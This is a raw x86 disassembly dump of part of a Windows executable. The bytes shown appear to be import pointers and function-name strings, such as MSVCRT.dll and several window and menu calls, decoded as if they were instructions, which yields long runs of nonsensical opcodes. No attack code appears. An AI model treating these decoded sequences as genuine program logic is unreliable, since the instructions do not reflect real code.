  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
